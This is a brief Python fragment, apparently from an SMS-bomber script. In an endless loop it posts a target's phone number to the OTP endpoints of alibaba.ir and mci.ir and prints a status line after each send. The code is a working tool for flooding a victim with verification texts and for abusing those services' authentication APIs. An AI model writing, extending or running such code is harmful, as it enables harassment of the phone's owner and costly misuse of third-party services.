...
while True:
    ...
    requests.post("https://ws.alibaba.ir/api/v3/account/mobile/otp",data={"phoneNumber":f"{phone}"})
    print(green+"[+]",blue+f"send alibaba phone [{phone}] \n")
    ...
    requests.post("https://api-ebcom.mci.ir/services/auth/v1.0/otp",data={"msisdn":f"{phone}"})
    print(green+"[+]",blue+f"send mci.ir phone [{phone}] \n")
